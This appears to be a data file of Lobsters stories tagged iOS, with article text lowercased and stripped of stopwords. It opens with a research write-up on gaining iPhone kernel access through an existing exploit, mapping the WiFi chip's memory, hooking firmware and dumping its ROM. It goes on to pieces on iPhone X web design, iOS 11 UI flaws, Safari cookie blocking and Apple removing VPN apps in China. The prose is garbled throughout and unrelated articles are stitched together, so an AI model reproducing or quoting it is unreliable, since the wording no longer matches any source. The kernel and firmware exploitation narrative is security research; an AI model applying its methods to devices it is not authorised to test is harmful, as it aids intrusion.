several interface chip may debugged including uart jtag interface said several disadvantage approach first need open device locate required interface make sure damage phone process moreover requiring setup research device would cause u incur significant startup overhead perhaps importantly relying hardwarebased approach would limit amount researcher willing utilise research platform hardware relatively specialised skillset since people might rightly wary causing damage device completely softwarebased solution android device able access chip memory solely using software perhaps similar solution would apply apple device answer question let trace way android component involved control flow accessing wifi chip memory host flow begin user issuing memory access command via broadcom debugging utility membytes turn trigger ioctl broadcom driver requesting memory access operation processing within driver performs requested action directly accessing chip tightlycoupled memory tcm kernel virtual addressspace va two register walk bar mostly interested latter part let disregard androidspecific component focus mechanism bcmdhd allowing tcm access host reviewing driver code allows u arrive relevant code flow first driver enables pcieconnected wifi chip access pcie configuration space program wifi chip base address register bar keeping pci standard programming mapping bar host address space expose functionality directly wifi soc host iospace memory space access taking closer look broadcom chip seem provide two bar configuration space used mapin register corresponding different core wifi soc including arm processor running firmware logic esoteric component pcie gen core wifi soc core selected accessing pcie configuration space programming window register directing backplane address corresponding requested core hand used solely map wifi chip tcm host since broadcom driver leverage tcm access capability extensively mapsin kernel virtual address space device initialisation unmap device shuts tcm mapped kernel subsequent memory access chip tcm performed simply modifying mapped block within kernel va write operation made memorymapped block automatically reflected wifi chip ram well good io since apple develops driver interacting broadcom chip hold true broadcom driver necessarily apply apple driver could think many different approach accessing chip memory example instead mapping entire tcm kernel memory might elect mapin certain region tcm map ondemand even rely different chipaccess mechanism altogether get bottom need start reverseengineering apple driver done extracting kernelcache iphone firmware loading favourite disassembler loading kernel immediately come across two driver kexts related broadcom wifi chip applebcmwlancore applebcmwlanbusinterfacepcie spending time reverseengineering two driver quickly evident corresponding role applebcmwlancore serf highlevel driver dealing mostly configuring wifi chip handling incoming event chipspecific feature offloading keeping good design practice driver unaware interface chip connected allowing focus solely logic required interact chip contrast applebcmwlanbusinterfacepcie serf complementary role lowlevel driver tasked handling pcie related communication protocol dealing msi interrupt generally everything interfacerelated revisit two driver indepth later sufficient say relatively good idea start looking potential tcm mapping seen tcm access performed mapping pcie bar therefore would stand reason operation would performed applebcmwlanbusinterfacepcie reverseengineering much driver come across group suspiciouslooking function appear like candidate tcm accessors function serve purpose accessing memorymapped buffer differing one another size word used anecdotally corresponding apis tcm access android driver follow structure function reference string memory might onto something kernel function crossreferencing way callchain appears function method pertaining instance single class incidentally bear name driver applebcmwlanbusinterfacepcie since several function callchain virtual function locate class vtable searching word containing address within kernelcache avoid unnecessary confusion object driver refer object pcie object refer driver full name applebcmwlanbusinterfacepcie kernel memory analysis framework identified mechanism kernel possibly relating wifi chip tcm next course action somehow access able debug io kernel could simply placed breakpoint aforementioned memory access function recorded location shared buffer used debugger freely access buffer however happens io offer debugger indeed debugger would allow user subvert device security model instead create kernel debugger debugger usually consist two main piece functionality ability modify control flow program eg inserting breakpoints ability inspect modify data processed program happens modifying kernel control flow modern apple device iphone far trivial device include dedicated hardware component apple memory cache controller amcc designed prevent attacker modifying kernel code even presence full control kernel ie code execution amcc might make interesting research target right main focus research time instead make analysing modifying data processed kernel gain access kernel first need exploit privilege escalation vulnerability luckily forgo complexity involved developing functional kernel exploit instead rely excellent work ian beer earlier year ian developed fullyfunctional exploit allowing kernel code execution sandboxed process system upon successful execution ian exploit provides two primitive memoryread memorywrite allowing u freely explore kernel virtual addressspace since exploit developed io need use version target iphone utilise allow increased flexibility aim design research platform modular instead tying platform specific memory access mechanism use ian exploit blackbox deferring memory access exploit primitive moreover important whatever system build allows u explore device comfortably thinking moment boil basic requirement analysis done developerfriendly machine iphone platform scriptable easily extensible platform independent memory access mechanism used prevent dependance memory access mechanism implement rudimentary command protocol allowing client perform read write operation well offering execute primitive gadget within kernel va next insert small stub implementing protocol exploit allowing u interface exploit black box client executed machine long able connect server stub communicate using protocol version ian beer extrarecipe exploit aforementioned server stub found bug tracker lastly question research platform convenience sake decided develop framework set python script unlike forensics framework volatility slowly grow framework go along adding script new data structure come across since io kernel relies heavily dynamic dispatch ability explore kernel shelllike interface allows u easily resolve virtual call target inspecting virtual pointer corresponding object use ability extensively assist static analysis place code hard untangle course research develop several module analysis framework allowing interaction object within xnu kernel part iokit hardware component finally wifi chip setting test network moving need create segregated test network consisting target iphone single macbook use interact iphone wifi router memory analysis framework transmits data network iphone macbook must able communicate one another additionally using xcode deploy exploit macbook iphone advantageous test network allowed device access internet developer profile could verified lastly require complete control aspect wifi router since next part research deal extensively wifi layer like reserve ability inject modify drop frame within network primitive may come handy later putting requirement together arrive following basic topology lab setup role wifi router fulfilled thinkpad laptop running ubuntu connected two softmac dongle one interface internal external internal network accesspoint broadcast using hostapd external interface connects internet using wpasupplicant moreover networkmanager disabled prevent interference configuration note imperative dongle used broadcast internal network accesspoint softmac device fullmac ensure mlme mac layer processed host software ie linux kernel hostapd allowing u easily control data transmitted layer depending work environment may case many wifi channel rather crowded thereby reducing signal quality substantially dropping frame normally affect ability use network frame would simply retransmitted may certainly cause undesirable effect attempting run overtheair exploit retransmissions may alter firmware state substantially anecdotally scanning nearby network around desk revealed around wifi network causing quite bit noise frame loss encounter issue boost rssi building small cantenna connecting dongle finding tcm using test network memory analysis platform let start exploring kernel va begin hunt searching pcie object within kernel know finding object allow u locate suspect tcm mapping bringing u closer goal developing wifi firmware debugger since unable place breakpoints need locate path leading known memory location pcie object identify pcie object come across well c standard explicitly specify dynamic dispatch implemented compiler tend use abi purpose first word every object containing virtual function serf pointer object virtual table commonly referred virtual pointer vptr leveraging little tidbit build object identification mechanism simply read first word object come across check virtual table corresponds since already located vtable corresponding pcie object need check object address know identify object begin searching within kernel start object could anywhere kernel va perhaps gain information taking look object constructor starter allow u find allocator used create object lucky object may allocated special pool stored static location kernel function osobject new operator wrapper around kalloc xnu kernel allocator looking code appears pcie object allocated special pool perhaps instead object addressable data stored driver bs data segment following every chain pointer originating segment able locate chain terminating desired object test hypothesis let write short python script perform depthfirst search object starting driver bs data segment script simply iterates word check whether appears valid kernel virtual address recursively continues search following pointer neighbouring pointer searching forward backwards stopping maximal search depth reached object located running dfs following pointer level deep find matching chain appears none object bs data segment contain sufficiently short pointer chain leading target object proceed let take moment consider know object far first object allocated using xnu kernel allocator kalloc also know exact size allocation byte course mean identifying object located perhaps could inspect allocator locate object one hand entirely possible kalloc keep track inuse allocation tracking object would rather difficult hand kalloc way identifying past allocation parse data structure follow logic identify object get bottom let download xnu source code corresponding version io read kalloc implementation spending time familiarising kalloc implementation sketch highlevel view allocator implementation since kalloc zone allocator allocated object assigned region drawn individual region represented zonet structure hold metadata pertaining zone allocator operation roughly split two phase identifying corresponding zone allocation carving allocation zone identification process take three distinct flow depending size requested allocation target zone identified allocation process proceeds identically three flow allocation performed zone lifetime must keep track internal metadata including zone size number stored element many bit piece importantly however zone must track state memory page assigned kernel lifetime many object allocated subsequently freed causing different zone page fill vacate allocation triggered iteration possible page searching vacancy kalloc would quite inefficient instead tackled keeping track several queue denoting state memory page assigned zone among queue stored zone two queue particular interest u putting together identify allocated object kalloc simply following mechanism used allocator locate target zone find matching zone parse queue locate allocation made within zone stopping reach target object using new kalloc module search pcie object using vtable address found earlier finally greeted positive result object successfully located within kernel va next simply follow step identified memory accessors analysed earlier order extract location suspected tcm mapping within kernel since tcm mapping provides view wifi chip ram naturally expect begin value identified ram file extracted firmware let try read value buffer see whether match ram dump great finally found tcm brings u one step closer acquiring rom building research environment wifi soc acquiring rom tcm mapping provides view wifi chip ram accessing ram undoubtedly useful allows u gain visibility runtime structure used chip heap state allow u directly access chip rom go effort begin well thus far used mapped tcm buffer read wifi soc ram recall mapping also allows u freely write data written memorymapped buffer automatically reflected back wifi soc ram therefore leverage newly acquired write access chip ram order modify chip behaviour perhaps importantly insert hook ramresident function firmware direct flow towards code chunk already built patching infrastructure previous blog post incorporate code module analysis framework allows u provide convenient interface simply select target ram function provide corresponding assembly stub framework proceeds patch function behalf direct shellcode execute hook emulate original prologue finally return back original function shellcode stub written top heap largest free chunk allowing u avoid overwriting important data structure ram building technique let insert hook commonly invoked ram function chip ioctl handler invoked hook simply copy small window rom predetermined region ram note since ram slightly larger rom leak entire rom one go resort iterative approach instead rom chunk copied shellcode stub signal completion cause host subsequently extract leaked rom content notify stub next chunk rom may leaked indeed inserting hook running scheme detailed finally presented complete copy chip rom finally move analysing firmware image properly load firmware disassembler need locate rom ram loading address well respective size seen past chip rom mapped address zero span several kb ram hand normally mapped fixed higher address multiple way ram loading address deduced first ram blob analysed previously embeds loading address fixed offset verify address validity attempting load ram offset disassembler observing branch resolve correctly alternately extract loading address pcie object identified earlier kernel contains attribute field object regardless method yield result ram loaded address byte long building wifi firmware debugger extracted rom achieved tcm access capability also build module allow u easily interact wifi chip module act debugger sort wifi firmware allowing u gain full readwrite capability wifi firmware well providing several key debugging feature next blog post continue expanding functionality provided module go along resulting complete research framework wrapping blog post performed initial investigation wifi stack apple mobile device using privileged research platform poke around kernel managed locate wifi firmware tcm mapping host extract wifi chip rom analysis also started fleshing research platform within io kernel allowing u build wifi firmware debugger well several module parsing kernel structure useful tool next stage research next blog post use firmware debugger order continue exploration wifi chip present iphone perform deep dive firmware discover multiple vulnerability develop overtheair exploit one allowing u gain full control wifi soc
254,Lobsters,ios,Apple iOS,Designing Websites for iPhone X,https://webkit.org/blog/7929/designing-websites-for-iphone-x/,designing website iphone x,iphone x human interface guideline uikit documentation using whole screen respecting safe area new cs function four predefined environment variable bringing together min max brandnew cs function treatment invalid variable feedback question xcode webevangelist applecom webkit webkit bug tracker,section safe area inset updated oct reflect change io beta box safari display existing website beautifully edgetoedge display new iphone x content automatically inset within display safe area obscured rounded corner device sensor housing inset area filled page backgroundcolor specified body html element blend rest page many website enough page text image solid background color default inset look great page especially designed fullwidth horizontal navigation bar like page optionally go little take full advantage feature new display iphone x human interface guideline detail general design principle keep mind uikit documentation discus specific mechanism native apps adopt ensure look good website make use similar new piece webkit api introduced io take full advantage edgetoedge nature display reading post tap image visit corresponding live demo page take peek source code safari default insetting behavior using whole screen first new feature extension existing viewport meta tag called viewportfit provides control insetting behavior viewportfit available io default value viewportfit auto result automatic insetting behavior seen order disable behavior cause page lay full size screen set viewportfit cover viewport meta tag look like meta nameviewport viewportfitcover reloading navigation bar look much better running edge edge however immediately clear important respect system safe area inset page content obscured device sensor housing bottom navigation bar hard use use viewportfitcover fill whole screen respecting safe area next step towards making page usable adopting viewportfitcover selectively apply padding element contain important content order ensure obscured shape screen result page take full advantage increased screen real estate iphone x adjusting dynamically avoid corner sensor housing indicator accessing home screen safe unsafe area iphone x landscape orientation inset indicated achieve webkit io includes new cs function env set four predefined environment variable safeareainsetleft safeareainsetright safeareainsettop safeareainsetbottom combined allow style declaration reference current size safe area inset side env function shipped io name constant beginning safari technology preview io beta constant removed replaced env use cs fallback mechanism support version necessary prefer env going forward env work anywhere var example inside padding property post padding paddingleft env safeareainsetleft paddingright env safeareainsetright browser support env style rule includes ignored reason important continue separately specify fallback rule declaration using env respect safe area inset important content visible bringing together min max section cover feature available starting safari technology preview io beta adopt safe area inset website design might notice somewhat difficult specify want minimum padding addition safe area inset page replaced left padding env safeareainsetleft rotate back portrait left safe area inset becomes text sits immediately adjacent screen edge safe area inset replacement margin solve want specify padding default padding safe area inset whichever greater achieved brandnew cs function min max available future safari technology preview release function take arbitrary number argument return minimum maximum used inside calc nested inside function allow calc like math inside case want use max support padding max post paddingleft max env safeareainsetleft paddingright max env safeareainsetright important use support featuredetect min max supported everywhere due cs treatment invalid variable specify variable inside support query example page portrait orientation env safeareainsetleft resolve max function resolve landscape env safeareainsetleft larger due sensor housing max function resolve size instead ensuring important content within always visible use max combine safe area inset traditional margin experienced web developer might previously encountered cs lock mechanism commonly used clamp cs property particular range value using min max together make much easier helpful implementing effective responsive design future feedback question start adopting viewportfit safe area inset today using safari iphone x simulator included xcode love hear adoption feature go please feel free send feedback question webevangelist applecom webkit twitter file bug run webkit bug tracker
255,Lobsters,ios,Apple iOS,Dive into the details of iOS 11: Is Apple still detail-oriented?,https://gist.github.com/anonymous/a444036381a3faaca85170142f418d39,dive detail io apple still detailoriented,detail io apple still mailapp watchapp filesapp http http app storeapp http healthapp today widget http http http http photosapp settingsapp musicapp http http http control center http http weatherapp faux bold issue pingfang safari testing found would happen cs fontfamily includes applesystem ie fontfamily using san francisco font provided system removed system honor font weight provided font faux bold gone issue safari impact app using webkit engine io render web page wechat internal browser doubanapp see doubanapp dominated faux pingfang bold looking quite bad randomly picking movie review post notice title faux bold comparison also notice font spacing faux bold problematic actually bold font also regular font weight seeing faux regular faux regular easily identified stroke weight comparison notice font spacing different io line text different word prof faux regular presence check picture faux bold wechatapp faux font issue safari appeared io beta submitted bug report feedback app earlier august case number yet still issue today likely io typography enthusiast quite disappointed thing end,detail io apple still day ago apple fall special event steve job theater located inside apple park unveiling screen iphone x later pushing io gm beta tester going officially next week updated phone soon got push io gm since wwdc june beta tester io intensive summer incremental update inch iphone io gm hand still exist quite lot unfinished feeling beta software designer help writing feeling writing help people realizing many detail requiring polish hopefully includes folk apple push forward change improve detail unfinished feeling io mostly come ui animation ui element io quite inconsistent mixing variety ui element might look quite similar introduce disconnected feeling ux inconsistency element majorly stem ui element updated io large title new search bar opinion newly introduced element might unfamiliar new even apple engineer caused many inconsistent ui experience io mailapp first let look mailapp io like native apps mail also introduces new navigation bar large title however large title mail extra left margin compared design guide example use search bar reference object design guide example large title search bar share distance edge mailapp large title clearly move bit right compared search bar watchapp watchapp search bar following suggested style standing unfitted background native apps adopting io style search bar match navigation bar naturally unlike watchapp instruction video building apps iphone x published apple mentioned exactly case wwdcapp left counterexample matching style contactsapp right best practice matching style commenter video claim move second issue bring search field well look quite right let compare contact app list couple thing look wrong color search bar background quite right sizing bit therefore io sugggesting matched background search bar navigation bar yet watchapp follow native app clicked search bar watchapp almost kissing status bar show polish done apple engineer filesapp search bar filesapp also issue seems filesapp engineer used nonstandard search bar picture compared standard search bar settingsapp filesapp slightly smaller search bar lighter font color besides colorsize difference animation clicking search bar also different animation standard search bar settingsapp http search bar filesapp http comparatively search bar filesapp faster animation le natural animation logic bit unfinished feeling app storeapp io app store gone redesign introduced similar style like apple music however app store today tab compared apple music font date different app store us bold one apple music us light one apple music wednesday followed comma app store comma missing also comparison two apps search page touching trending item app store trigger hover effect feedback touch similar action apple music search page trigger hover effect changing backgroundforeground color item opinion apple music better native apps consistent upon decision hover feedback regardless besides still miscellaneous issue among detail app store open app banner image slightly swipe left edge right full swipe dismiss app page banner section render strangely page bounce back could check bug using video http also rendering issue update tab pull refresh item obvious frame drop large title pulled much feel easily healthapp healthapp today page health data page data style different width old issue io still fixed yet today widget io two way open today widget either swiping left right home screen lock screen yet search bar page invoked different way different behavior invoked home screen pulling widget page show search screen clicking search bar missing animation showing dismissing frosted glass effect animation widening search bar though animation shortening hitting cancel overall experience quite awkward http invoked lock screen animation everywhere pulling widget page correctly show search screen smooth natural experience http causing quite disconnected feeling today widget two scenario obviously one invoked home screen quite unfinished compared one invoked lock screen weird today widget invoked home screen io animation could show search screen pulling idea go backwards io nevertheless today widget invoked locked screen io also going bit backwards compared io today widget page user pull page search bar hover widget frosted glass preventing widget stacking onto search bar however clicking search bar cause frosted glass disappear immediately slowly rendering full screen frosted glass cancelling search bar cause full screen frosted glass disappear slowly immediately rendering small section frosted glass without animation bit unnatural http pay attention search bar top screen video fast could check frame see full screen frosted glass related top section frosted glass term smooth rendering leading disconnected feeling besides missing animation io also brings redundant animation io every time swiping today widget back locked screen player section resize quite unnecessary http siri search suggestion page invoked clicking search bar two issue first touching suggestion hover feedback using width le screen width causing hover feedback become weird rectangle appropriate hover feedback already present apple music hover effect take full screen width second quite strange look carefully siri search suggestion font see jagged especially latin script near edge smooth even compare input text screen photosapp inappropriate margin either much little appears many place io causing greater feeling unfinishedunpolished work shared tab photosapp margin pointed arrow narrow inconsistent compared native apps similar page settingsapp settingsapp apple id section alignment device list completely id section correct io broken io musicapp apple music connect section post really small margin picture text design decision since margin itunes client desktop macos appropriate though connect de facto rarely used feature apple making basic mistake ui design also apple music entering album list library clicking initial letter list go quickly section see section initial letter top cutting album cover advertised feature io wwdc player screen apple music also becomes weird io reopening player screen cause shadow played album cover disappear shrinked album cover pausing also enlarge back reopening player screen pause music album cover zoom close reopen player screen album cover zoom back http music playing shadow album cover close reopen player screen shadow gone http io airpods airplay device connected player screen show device name near airplay icon gone io folk might think design choice yet bug actually video airplay device connected device name indeed displayed correctly however reopening player screen make disappear design choice device name shown initially http podcastsapp use design style apple music airplay device name always another bug apple music know two way go slide top io either clicking status bar clicking icon tab bar apple music hitting status bar correctly go back large title navigation bar hitting tab icon return small font navigation bar shown since podcastsapp app storeapp clicking either return large title navigation bar behavior apple music definitely bug control center control center airplay device section also issue often usage airpods control center show iphone device airpods shown device pausing music cause device become iphone though airpods still playing video case http also inappropriate animation control center touch animation screen mirroring http weatherapp weatherapp io also updated using larger font le margin yet noticed temperate text io centeraligned io might io design decision however actual usage due nonalignment digit obvious user text closer left edge show pro compared io faux bold issue pingfang safari last serious issue opinion font issue might impact normal usage issue actually impact everyone u faux bold font issue pingfang io default chinese typeface io safari discovered issue testing personal website io comparison taken io io shown pingfang actually rendering faux bold faux bold basically using font weight provided font add font weight base font weight forcibly faux bold generated algorithm often lacking quality causing issue stroke weight letter tracking screenshot could see faux bold pingfang io larger spacing text testing found would happen cs fontfamily includes applesystem ie fontfamily using san francisco font provided system removed system honor font weight provided font faux bold gone issue safari impact app using webkit engine io render web page wechat internal browser doubanapp see doubanapp dominated faux pingfang bold looking quite bad randomly picking movie review post notice title faux bold comparison also notice font spacing faux bold problematic actually bold font also regular font weight seeing faux regular faux regular easily identified stroke weight comparison notice font spacing different io line text different word prof faux regular presence check picture faux bold wechatapp faux font issue safari appeared io beta submitted bug report feedback app earlier august case number yet still issue today likely io typography enthusiast quite disappointed thing end recent year discussion degeneration software quality apple apple stepping steadily bioinformatic machine learning ar many field growing business slowly losing detailoriented focus design product like event listening beatles steve wisdom word moment feeling still good old day however apple different day honestly intention smearing apple owner many apple product many aspect life apple still favorite mostly respected company sincerely wish stepping forward apple could still maintain value cherished built past
256,Lobsters,ios,Apple iOS,Our Approach to Privacy - Apple,https://www.apple.com/privacy/approach-to-privacy/,approach privacy apple,siri ondevice suggestion random identifier ondevice processing siri dictation improving siri dictation suggestion search safari,siri siri designed much learning possible offline right device search request associated random identifier long string letter number apple id ondevice suggestion ask siri read search information device message note siri provides many type suggestion including safari map personal information kept device rather sent apple server siri suggestion quicktype keyboard feature made possible appledeveloped neural network language process run directly device random identifier although apple attempt much possible device use certain feature like making voice request siri searching spotlight safari realtime input needed apple server send information server protect privacy using random identifier apple id information like location may sent apple improve accuracy response allow disable location service time ondevice processing even request come apple server keep much personal information device example ask siri read one message siri read message without sending apple server siri dictation longer use siri dictation better understand improve help siri dictation recognize pronunciation provide better response certain information name contact music book podcasts enjoy sent apple server using encrypted protocol siri dictation associate information apple id rather random devicegenerated identifier reset identifier time turning siri dictation back effectively restarting relationship turn siri dictation apple delete siri data including request history associated siri identifier learning process start improving siri dictation default apple retain audio recording siri dictation interaction computergenerated transcript used improve siri dictation opt help siri improve allowing apple store review audio siri dictation interaction opt time audio sample associated random identifier instead apple id addition delete siri dictation request including audio recording computergenerated transcript associated random identifier apple server time note request six month old small sample request reviewed may deleted longer associated random identifier suggestion search safari use safari search io ipados spotlight macos search sent apple server along contextual information like location action taken search session provide relevant suggestion information associated random identifier apple id search location connected personally suggestion search safari new random identifier generated every minute precise location never shared server instead approximate location device sent using location fuzzing choose disable suggestion search safari choose disable locationbased suggestion apple still use ip address determine general location make suggestion relevant
257,Lobsters,ios,Apple iOS,Every Major Advertising Group Is Blasting Apple for Blocking Cookies in the Safari Browser,http://www.adweek.com/digital/every-major-advertising-group-is-blasting-apple-for-blocking-cookies-in-the-safari-browser/,every major advertising group blasting apple blocking cooky safari browser,update,biggest advertising organization say apple sabotage current economic model internet plan integrate cookieblocking technology new version safarisix trade interactive advertising bureau american advertising federation association national advertiser two deeply concerned apple plan release version internet browser override replaces user cookie preference set applecontrolled standard feature called intelligent tracking prevention limit advertiser website track user across internet putting place limit ad retargetingin open letter expected published afternoon group describe new standard opaque arbitrary warning change could affect infrastructure modern internet largely relies consistent standard across website group say feature also hurt user experience making advertising generic le timely useful apple unilateral heavyhanded approach bad consumer choice bad adsupported online content service consumer love according copy letter obtained adweek morning blocking cooky manner drive wedge brand customer make advertising generic le timely useful put simply machinedriven cookie choice represent user choice represent browsermanufacturer choice course digital advertising world lot lose hypertargeting becomes diluted according emarketer report released march digital ad spending u expected reach billion nearly percent last yearwhen apple first announced limitation crosswebsite tracking june company said change meant improve trust user explaining user feel trust broken tracked privacysensitive data web activity acquired purpose never agreed statement emailed adweek regarding industry group letter apple reiterated importance consumer privacy also pointing safari first browser block thirdparty cooky default even introduction intelligent tracking prevention according apple intelligent tracking prevention still allow tracking website person visit ad tracking technology become pervasive possible ad tracking company recreate majority person web browsing history according apple spokesperson information collected without permission used ad retargeting ad follow people around internet safari update detect eliminate cooky data block actual ad google however already testing ad blocker chrome could released broadly next year trade group criticized move apple industry expert said latest feature welcome addition intelligent tracking prevention us machine learning block company relationship consumer employing crosssite tracking workarounds said jason kint ceo digital content next online publishing group may perfect solution applaud apple effort closely align context consumer expectation full copy letter also signed data marketing association network advertising initiative september open letter digital advertising community undersigned organization leading trade association digital advertising marketing industry collectively representing thousand company responsibly participate shape today digital landscape million consumer serve deeply concerned safari browser update apple plan release override replaces existing usercontrolled cookie preference apple set opaque arbitrary standard cookie handling safari new intelligent tracking prevention would change rule cooky set recognized browser addition blocking thirdparty cooky ie set domain one visited current version safari new functionality would create set haphazard rule use firstparty cooky ie set domain user chosen visit block functionality purge user browser without notice choice infrastructure modern internet depends consistent generally applicable standard cooky digital company innovate build content service advertising personalized user remember visit apple safari move break standard replaces amorphous set shifting rule hurt user experience sabotage economic model internet apple unilateral heavyhanded approach bad consumer choice bad adsupported online content service consumer love blocking cooky manner drive wedge brand customer make advertising generic le timely useful put simply machinedriven cookie choice represent user choice represent browsermanufacturer choice organization devoted innovation growth consumer economy actively oppose action like company harm consumer distorting digital advertising ecosystem undermining operation strongly encourage apple rethink plan impose cookie standard risk disrupting valuable digital advertising ecosystem fund much today digital content service signed american association advertising agency american advertising federation aaf association national advertiser ana data marketing association dma interactive advertising bureau iab network advertising initiative nai update story updated include statement apple regarding ad industry group letter
258,Lobsters,ios,Apple iOS,Apple Special Event for September 2017,https://www.apple.com/apple-events/september-2017/,apple special event september,,love watch episode especially one steve job work great issue one request go back much farther please seen every single one would really like watch older one hd want see much steve legendary keynote
260,Lobsters,ios,Apple iOS,iOS and macOS: What does the future hold?,http://www.macworld.com/article/3219695/ios/future-of-ios-and-macos.html,io macos future hold,danger mac o x getting old tweet steve troughtonsmith google nextgeneration operating system project every decade plow ahead front lean io replace macos apple o o theseus io come sort different device affiliate link policy,easy get focused detail present miss obvious question future john siracusa wrote danger mac o x getting old operating system around five wrong apple would need address major shortcoming operating system long termso io riding high serving basis pretty much every major apple platform mac hard imagine come next yet tweet steve troughtonsmith made eye pop open linking fascinating ar technica story fuschia google nextgeneration operating system project troughtonsmith wrote far enough age mobile big player designing os follow itsurprised apple crazy think apple would want replace io macos something new unified postxnu kernel run io macos postbsd unix underpinnings io macos replace macos okay played game mac changed chip architecture every decade year macosos x classic mac o lasted amount time io comparatively young still year old built top mac o x base perhaps time coming sooner think perhaps let look apple longterm o choice plow ahead front scenario apple continues maintain two separate related base operating system macos io io continues receive lot attention macos also get major new feature especially one synergistic addition io lot extra work two totally separate operating system leaving aside io derivative run apple watch apple tv homepod mac business apple want abandon io going replace left steady state applelean io replace macos people would argue current state affair sure still get love annual true difference first two scenario mostly apple ultimate goal io apple building io especially ipad operating system powerful enough outright replace macos someone us io get real work done think apple still got long way go io could feel comfortable making io desktop laptop shutting production mac company could get made concerted effortapple o way apple go would continue updating io macos annually pull resource project instead begin building foundation entirely new operating system one run device small apple watch airpods large imac mac pro operating system take best io ditch suggests replacing xnu kernel bsd unix something new new single operating system would basis future apple product distinction mac io would drop awaythe o theseusmy guess apple stomach complicated operatingsystem migration especially io app store well io proven remarkably adaptable last year apple shown preference replace part operating system bit bit rather chucking everything wholesale io device run different filesystem ran last year apple programming language future swift coexists objectivec language apple inherited next seems prefer invisible subtle slow technology transition whenever possible seems apple would rather keep making change behind scene io whenever possible keeping relevant modern rather making clean break confuses market make life hard developer potentially slows momentum iphone app store appleif replacing io piece piece future leave macos believer io come sort different device future mac remain alive kicking probably long anyone want use gratefulthe continued existence mac give apple powerful come io development something io market user type serve apple point mac declare solutionthis seems current state affair apple investing io swapping bit piece go allowing grow something embarking crash course build mac replacement macos keep hanging around gaining new feature urgency exciting certainly could turn wrong sometimes slow steady really win race note purchase something clicking link article may earn small commission read affiliate link policy detail
261,Lobsters,ios,Apple iOS,iOS 11 Cop Button Temporarily Disables Touch-ID,https://www.theverge.com/2017/8/17/16161758/ios-11-touch-id-disable-emergency-services-lock,io cop button temporarily disables touchid,twitter user discovered murder victim fingerprint face unlocking next iphone public beta available right,apple adding easy way quickly disable touch id io new setting designed automate emergency service call let iphone user tap power button quickly five time call automatically dial emergency service default brings option also temporarily disables touch id enter passcode twitter user discovered new option io public beta verge verified work intended previously wanted temporarily disable touch id need restart iphone wait day device automatically prompt passcode awkwardly use different finger time force lock disable touch id setting apple new method far discreet way locking phone especially situation worried someone might force unlock phone quickly disabling touch id useful certain situation unlocking phone fingerprint sensor hot topic law enforcement request police michigan even murder victim fingerprint gain access device fear access device border control point around world quick trick least prevent touch id used passcode entered new io feature even relevant consider apple expected introduce face unlocking next iphone ability quickly disable touch id face unlock feature io could even useful scenario might need physically forced unlock phone io likely roll existing device next month public beta available right brave enough test
262,Lobsters,ios,Apple iOS,Developing for iPhone Pro,http://www.allenpike.com/2017/developing-for-iphone-pro/,developing iphone pro,made fascinating discovery reason phone home function back home sweet home either side home button app navigation item brad elli wrote,yesterday steve troughtonsmith made fascinating discovery longrumoured iphone pro resolution x rumour allscreen iphone year resolution finally consider mean developer resolution x point rendered exactly logical width iphone taller great far width existing app really going displaying apps point tall mockups assume yes iphone pro almost entirely screen apps fill screen home button relegated back phone possible guess pretty awful could important home button people press dozen time day home button front iphone laying table would hobbled sad really reason phone home function back back phone might tolerable fingerprint sensor home button home sweet home ten year home button going virtual beautiful new oled display function area carved bottom home middle many thing apple could put either side home button androidlike multitasking button suppose io give u giant clue either side home button app navigation item see io made visual tweak nice refinement two systemwide change seemed arbitrary shrank size signal strength indicator make room peninsula top iphone pro created large title navigation style reason large title particular look plain weird current hardware instead putting title center navigation bar io prefers title outside navigation bar leaving middle screen really empty really weirdly empty way weird navigation bar make sense iphone pro away navigation bar know example mockup happens dedicate bottom iphone pro resolution currently know navigation bar replace title home button clean tidy surprisingly easy implement uikit apps default interface navigation bar specifies left right item rather explicitly laying thing top screen lot apps could work way recompile course tidiness enough getting additional space content nice change navigation dramatically also better use considering much easier reach bottom screen top screen better believe better may crackerjack designer brad elli wrote expect see apps move functionality bottom reachable part screen think right way expected rather thoughtfully evaluating shift navigation bottom screen app app going pulled future jony fun train beautiful instead back button located literally least convenient place screen imagine right thumb nestled right beside old friend home button maybe even let jony put little clock face going wild people hold butt
263,Lobsters,ios,Apple iOS,On Apple Removing VPN Apps From the App Store in China,https://daringfireball.net/2017/07/apple_china_vpn_apps,apple removing vpn apps app store china,apple removing vpn apps app store china company blog expressvpn paul mozur report new york time story south china morning post january crackdown waldorf astoria beijing forced remove vpn service previously provided guest amazon sending cease desist letter aws customer using vpns china sagging popularity china year accounting almost billion revenue quarter ended three month ago chinese started blocking whatsapp week ago gatekeeper,apple removing vpn apps app store china monday july company blog expressvpn major vpn provider serving user china received notification apple today july roughly gmt expressvpn io app removed china app store preliminary research indicates major vpn apps io removed user china accessing different territory app store ie indicated billing address outside china impacted download io app continue receive update user china continue stay connected open internet expressvpn apps window mac android platform paul mozur report new york time sunday yokubaitis president golden frog company make privacy security software including vyprvpn said software taken app store gladly filed amicus brief support apple backdoor encryption battle fbi said extremely disappointed apple bowed pressure china remove vpn apps without citing chinese law regulation make vpn illegal added view access internet china human right issue would expect apple value human right profit popular sentiment apple stood china demand accepted consequence even meant losing sale china disingenuous pretend situation fraught complication also disingenuous claim apple bowed pressure china remove vpn apps without citing chinese law regulation make vpn illegal next paragraph time story say statement apple noted chinese government announced year developer offering vpns needed obtain government license required remove vpn apps china meet new regulation company said apps remain available market business story south china morning post january crackdown beijing launched nationwide campaign unauthorised internet connection including virtual private network vpn service allow user bypass country infamous great firewall notice released ministry industry information technology sunday said special cable vpn service mainland needed obtain prior government approval move making vpn service provider illegal story earlier month waldorf astoria beijing forced remove vpn service previously provided guest new york time reporter paul mozur life beijing posted twitter today amazon sending cease desist letter aws customer using vpns china apple alone many people reacting story think apple deciding acquiesce particular demand regarding vpn apps real issue twofold apple business china app store remain way install apps io device neither simple topic would argue neither question clearcut right thing answer first let dispose notion apple could chosen defy chinese government keep vpn apps app store technically apple could done would consequence guess chinese government would move block access app store china even block access apple server period would effectively render io device mostly useless iphones sagging popularity china year access apps popularity would drop zero apple would lot angry iphoneowning user china hand apple tugged refuse remove vpn apps app store thread would inextricably lead leaving entire chinese market easy say apple removed apps easy say apple pull china course complicated politically fact vast majority apple supply chain china say though yes china apple secondbiggest market world accounting almost billion revenue quarter ended three month ago apple could take stand draw line sand really think vpn apps app store hill apple die china get agree see two scenario china people buy use iphones get vpn apps app store china people buy use iphones first scenario obviously better apple financially would argue first scenario also better people china thing keep thinking imessage facetime among protocol available inside china endtoend encryption chinese started blocking whatsapp week ago know allow imessage facetime continue working protocol designed ground work using endtoend encryption switch imessage encryption apple flip inside china using imessage encrypted would surprise one china started blocking 